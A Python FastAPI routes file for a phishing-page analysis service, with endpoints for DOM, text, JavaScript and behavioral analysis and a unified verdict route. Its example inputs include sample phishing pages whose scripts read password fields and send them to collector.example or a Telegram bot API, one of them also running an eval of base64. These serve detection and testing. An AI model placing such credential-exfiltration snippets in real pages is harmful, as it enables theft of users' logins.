"""Public API routes: Part 2 preprocessing, Part 3 DOM features, Part 5 content,
Part 6A text prediction, Part 7 JS analysis, Part 8 behavioral intent, and the unified
Part 9 B-1 ``POST /api/v1/analyze`` (URL or HTML -> verdict).

Part 9: Preliminary tri-modal output (fusion + FastAPI).
"""

from __future__ import annotations

import json
import math
from typing import Annotated

from fastapi import APIRouter, Depends, HTTPException, Request, Response
from pydantic import BaseModel, ConfigDict, Field

from c2_analyzer.api.dependencies import (
    AnalysisEngine,
    get_engine,
    get_ingest_service,
    get_rate_limiter,
    get_result_cache,
    get_text_models,
)
from c2_analyzer.api.guards import RateLimiter, ResultCache
from c2_analyzer.behavior.pipeline import behavior_for_html
from c2_analyzer.content.extractor import content_for_html
from c2_analyzer.dom.pipeline import dom_features_for_html
from c2_analyzer.fusion.live_fetch import analyze_config
from c2_analyzer.fusion.orchestrator import BudgetExceeded
from c2_analyzer.ingest.service import IngestService
from c2_analyzer.js_analyzer.pipeline import js_analysis_for_html
from c2_analyzer.nlp.inference import TextModelRegistry
from c2_analyzer.preprocessing.pipeline import preprocess_html
from c2_analyzer.schemas.analysis import AnalysisRequest, AnalysisResponse
from c2_analyzer.schemas.behavior import BehaviorResult
from c2_analyzer.schemas.content import PageText
from c2_analyzer.schemas.dom import DomResult
from c2_analyzer.schemas.js import JsAnalysisResult
from c2_analyzer.schemas.nlp import TextPrediction
from c2_analyzer.schemas.parsed_page import ParsedPage

router = APIRouter()

EXAMPLE_HTML = (
    "<html><head><title>Verify your account</title></head><body>"
    "<h1>Account suspended</h1><p>Sign in within 24 hours.</p>"
    '<form action="https://collector.example/login.php" method="post">'
    '<input type="email" name="email"><input type="password" name="pass">'
    "<button>Sign in</button></form></body></html>"
)


class PreprocessRequest(BaseModel):
    """Input to ``POST /api/v1/preprocess``: raw HTML and, optionally, where it came from.

    ``url`` is only used to resolve relative links and decide internal vs
    external - it is NEVER fetched.
    """

    model_config = ConfigDict(
        json_schema_extra={
            "examples": [
                {"html": EXAMPLE_HTML, "url": "https://bank.example/login"},
                {"html": "<p>ශ්‍රී ලංකා - தமிழ் - English</p>", "url": None},
            ]
        }
    )

    html: str = Field(description="the page's HTML (larger than 5 MB is truncated)")
    url: str | None = Field(
        default=None, max_length=8192, description="page address, never fetched"
    )


@router.post(
    "/api/v1/preprocess",
    response_model=ParsedPage,
    tags=["preprocessing (Part 2)"],
    summary="HTML -> ParsedPage (Part 2 facts, no verdict)",
    responses={413: {"description": "request body larger than 5 MB"}},
)
def preprocess(request: PreprocessRequest) -> Response:
    """Run the Part 2 pipeline on one HTML string.

    Extracts and organizes (text, forms, links, scripts as text, DOM summary);
    it never runs JavaScript and never downloads anything. The JSON is exactly
    what ``preprocess_html.py`` stores for dataset samples (same aliases).
    """
    page = preprocess_html(request.html, request.url)
    # Serialized directly: the page was just built from the model, so FastAPI's
    # extra validation pass (slow for a 3000-node skeleton) adds nothing.
    return Response(page.model_dump_json(by_alias=True), media_type="application/json")


@router.post(
    "/api/v1/dom-features",
    response_model=DomResult,
    tags=["DOM features (Part 3)"],
    summary="HTML -> DOM security feature vector + evidence (Part 3, no verdict)",
    responses={413: {"description": "request body larger than 5 MB"}},
)
def dom_features(request: PreprocessRequest) -> Response:
    """Run Part 2 then Part 3 on one HTML string.

    Returns the fixed-order feature vector (``features``, order of
    configs/dom_features.yaml) and human-readable ``evidence``. Without ``url``
    the internal/external features are 0 and ``base_url_known`` is 0. Same
    code as ``extract_dom_features.py`` - the numbers match the training CSV.
    """
    result = dom_features_for_html(request.html, request.url)
    return Response(result.model_dump_json(), media_type="application/json")


EXAMPLE_JS_HTML = (
    '<html><body><form id="login"><input type="password" id="password">'
    "<button>Sign in</button></form><script>"
    "document.getElementById('login').addEventListener('submit', function (e) {"
    " e.preventDefault(); var pwd = document.getElementById('password').value;"
    " fetch('https://collector.example/c', {method: 'POST', body: JSON.stringify({p: pwd})});"
    " window['eval'](atob('YWxlcnQoMSk='));"
    "});</script></body></html>"
)


class JsAnalysisRequest(PreprocessRequest):
    """Input to ``POST /api/v1/js-analysis`` (same fields as /preprocess)."""

    model_config = ConfigDict(
        json_schema_extra={
            "examples": [
                {"html": EXAMPLE_JS_HTML, "url": "https://bank.example/login"},
                {
                    "html": "<a href=\"javascript:location.replace('https://x.example/')\">go</a>"
                    '<body oncontextmenu="return false">',
                    "url": None,
                },
            ]
        }
    )


@router.post(
    "/api/v1/js-analysis",
    response_model=JsAnalysisResult,
    tags=["JS analysis (Part 7)"],
    summary="HTML -> static JavaScript detections + feature vector (Part 7, no verdict)",
    responses={413: {"description": "request body larger than 5 MB"}},
)
def js_analysis(request: JsAnalysisRequest) -> Response:
    """Run Part 2 then Part 7 on one HTML string.

    Parses every inline script, event handler and javascript: URL with
    tree-sitter (never executes anything) and reports API usage with line
    numbers, arguments and PII-masked snippets, plus the js_v1 feature vector.
    External ``<script src>`` files are NOT downloaded (reference only). Same
    code as ``analyze_js.py`` - the numbers match the dataset CSV.
    """
    result = js_analysis_for_html(request.html, request.url)
    return Response(result.model_dump_json(), media_type="application/json")


EXAMPLE_BEHAVIOR_HTML = (
    "<html><head><title>Verify</title></head><body>"
    '<form id="f"><input type="email" id="email"><input type="password" id="password">'
    "<button>Sign in</button></form><script>"
    "var api = 'https://api.telegram.org/bot123:ABC/sendMessage';"
    "document.getElementById('f').addEventListener('submit', function (e) {"
    " e.preventDefault(); var p = document.getElementById('password').value;"
    " var u = document.getElementById('email').value;"
    " fetch(api, {method: 'POST', body: JSON.stringify({text: u + ':' + p})});"
    " location.replace('https://www.microsoft.com/');"
    "});</script></body></html>"
)


class BehaviorRequest(PreprocessRequest):
    """Input to ``POST /api/v1/behavior`` (same fields as /preprocess)."""

    model_config = ConfigDict(
        json_schema_extra={
            "examples": [
                {"html": EXAMPLE_BEHAVIOR_HTML, "url": "https://account-verify.example/login"},
                {
                    "html": "<script>window.location.replace('https://offer.example/');</script>",
                    "url": "https://news.example/",
                },
            ]
        }
    )


@router.post(
    "/api/v1/behavior",
    response_model=BehaviorResult,
    tags=["Behavioral intent (Part 8)"],
    summary="HTML -> sources, sinks, flows and behavioral patterns with evidence (Part 8)",
    responses={413: {"description": "request body larger than 5 MB"}},
)
def behavior(request: BehaviorRequest) -> Response:
    """Run Part 2, Part 7 and Part 8 on one HTML string.

    Links sensitive SOURCES (credential fields, keystrokes, cookies, clipboard
    ...) to SINKS (external requests, redirects, clipboard writes, eval ...)
    with a lightweight static taint analysis and reports the behavioral
    patterns (credential exfiltration, forced redirect, ClickFix, suspicious
    download, obfuscated execution ...) with severity, a plain-English message
    and the evidence chain (source line -> assignments -> sink line). Nothing
    is executed or downloaded. Same code as ``map_behavior.py``.
    """
    _, _, result = behavior_for_html(request.html, request.url)
    return Response(result.model_dump_json(), media_type="application/json")


class ContentRequest(PreprocessRequest):
    """Input to ``POST /api/v1/content`` (same fields as /preprocess)."""

    model_config = ConfigDict(
        json_schema_extra={
            "examples": [
                {"html": EXAMPLE_HTML, "url": "https://bank.example/login"},
                {
                    "html": '<html lang="si"><title>ගිණුම් අනතුරු ඇඟවීම</title><h1>හදිසි '
                    "දැනුම්දීමයි!</h1><p>ඔබගේ බැංකු ගිණුම පැය 24ක් ඇතුළත අත්හිටුවනු ලැබේ.</p>"
                    '<a class="btn" href="/v">දැන් තහවුරු කරන්න</a></html>',
                    "url": None,
                },
            ]
        }
    )


@router.post(
    "/api/v1/content",
    response_model=PageText,
    tags=["Content (Part 5)"],
    summary="HTML -> text segments, languages and model-ready page_text (Part 5, no verdict)",
    responses={413: {"description": "request body larger than 5 MB"}},
)
def content(request: ContentRequest) -> Response:
    """Run Part 2 then Part 5 on one HTML string.

    Splits the page text into segments (title, headings, CTAs, form labels,
    alert banners, paragraphs ...) with a language per segment and per page
    (en / si / ta / si_latn / ta_latn / mixed / other / unknown, confidence and
    method), masks emails / phones / NIC / card numbers, and builds the
    ``page_text`` string Part 6 reads. Nothing is classified here. Same code as
    ``build_text_corpus.py``.
    """
    _, result = content_for_html(request.html, request.url)
    return Response(result.model_dump_json(), media_type="application/json")


TextModelsDep = Annotated[TextModelRegistry, Depends(get_text_models)]  # tests override it


@router.post(
    "/api/v1/text-prediction",
    response_model=TextPrediction,
    tags=["Text model (Part 6)"],
    summary="HTML -> Part 5A page_text -> XLM-R + TF-IDF class probabilities (Part 6A)",
    responses={413: {"description": "request body larger than 5 MB"}},
)
def text_prediction(request: ContentRequest, models: TextModelsDep) -> TextPrediction:
    """Run Part 2 -> Part 5A -> Part 6A on one HTML string.

    Returns, per text model (fine-tuned XLM-R, TF-IDF baseline), the predicted
    threat class and the probability of every class. A model that is not trained /
    imported yet answers ``available: false`` with "model not available: ..." - the
    request still succeeds. The text-only arm of the ablation: no DOM or JS signal.
    """
    _, text = content_for_html(request.html, request.url)
    return models.get().predict(text.page_text, page_language=text.language.language)


EngineDep = Annotated[AnalysisEngine, Depends(get_engine)]  # tests override get_engine
CacheDep = Annotated[ResultCache, Depends(get_result_cache)]
HistoryDep = Annotated[IngestService, Depends(get_ingest_service)]  # Part 9 B-2


def require_json(request: Request) -> None:
    """415 unless the body is declared as JSON (the contract is JSON only)."""
    content_type = request.headers.get("content-type", "").split(";")[0].strip().lower()
    if content_type != "application/json":
        raise HTTPException(status_code=415, detail="send the request as application/json")


def client_id(request: Request) -> str:
    """Who is calling (rate-limit key): the socket peer, or X-Forwarded-For when trusted."""
    if analyze_config()["rate_limit"].get("trust_forwarded_for"):
        forwarded = request.headers.get("x-forwarded-for", "").split(",")[0].strip()
        if forwarded:
            return forwarded
    return request.client.host if request.client else "unknown"


def rate_limit(
    request: Request, limiter: Annotated[RateLimiter, Depends(get_rate_limiter)]
) -> None:
    """429 + Retry-After when one client sends too many analyses (protects the fetcher)."""
    wait = limiter.check(client_id(request))
    if wait is not None:
        raise HTTPException(
            status_code=429,
            detail="too many analyses from this client - slow down",
            headers={"Retry-After": str(max(1, math.ceil(wait)))},
        )


def _json(model_or_dict, status_code: int = 200) -> Response:
    text = model_or_dict if isinstance(model_or_dict, str) else json.dumps(model_or_dict)
    return Response(text, status_code=status_code, media_type="application/json")


@router.post(
    "/api/v1/analyze",
    response_model=AnalysisResponse,
    tags=["analysis (Part 9)"],
    summary="URL or HTML -> verdict, threat class, risk score, findings (schema c2.analysis.v1)",
    dependencies=[Depends(require_json), Depends(rate_limit)],
    responses={
        413: {"description": "html larger than 5 MB (or request body larger than 5 MB)"},
        415: {"description": "body is not application/json"},
        422: {"description": "invalid input (no url / html, url not http(s), > 2,048 chars)"},
        429: {"description": "rate limit per client exceeded (Retry-After header)"},
        503: {"description": "models could not be loaded (see GET /ready)"},
        504: {"description": "time budget exceeded - body = the partial AnalysisResponse"},
    },
)
def analyze(
    body: AnalysisRequest, engine: EngineDep, cache: CacheDep, history: HistoryDep
) -> Response:
    """Analyze a page end to end (Part 9 B-1).

    - ``{"url": ...}``: C2 fetches the page itself, statically and safely (no JS, no
      sub-resources, private / internal addresses refused, 5 MB / 5 redirects / timeout).
    - ``{"html": ..., "url"?: ...}``: analyze this HTML (paste / test mode, no fetch).

    Then Part 2 -> 3 -> 5A -> 6A -> 7 -> 8 -> the 9A fusion model -> verdict tiers +
    evidence floor. ``status`` says whether a verdict was possible (ok / inconclusive /
    unreachable / error); a failing model arm only sets ``degraded``. Repeated url checks
    within the cache TTL answer from memory with ``cached: true``.

    Every answered check is also stored in the scan history (Part 9 B-2, source = the
    request's ``source``); a storage problem is logged and never fails the analysis.
    """
    limit = int(analyze_config()["input"]["max_html_bytes"])
    if body.html is not None and len(body.html.encode("utf-8", errors="ignore")) > limit:
        raise HTTPException(status_code=413, detail=f"html larger than {limit // 2**20} MB")
    if body.mode == "url":
        hit = cache.get(body.url)
        if hit is not None:
            answer = {**hit, "cached": True, "request_id": body.request_id}
            history.record_user_check(body, AnalysisResponse.model_validate(answer))
            return _json(answer)
    try:
        orchestrator = engine.get()
    except RuntimeError as error:
        raise HTTPException(status_code=503, detail=f"models not loaded: {error}") from None
    try:
        result = orchestrator.analyze(body)
    except BudgetExceeded as late:
        return _json(late.response.model_dump_json(), status_code=504)
    if body.mode == "url" and result.status in ("ok", "inconclusive"):
        cache.put(result.model_dump(mode="json"), body.url, result.input.final_url)
    history.record_user_check(body, result)
    return _json(result.model_dump_json())


@router.post("/analyze-html", tags=["analysis (Part 9)"])
def analyze_html_legacy() -> None:
    """Compatibility route for backend/api-gateway, which calls
    ``POST {C2_URL}/analyze-html`` with ``{"url": ...}``.

    TODO (Part 9): agree with the gateway on one contract (URL vs raw HTML)
    and either fetch the page here or remove this route.
    """
    raise HTTPException(status_code=501, detail="Not implemented yet (Part 9)")
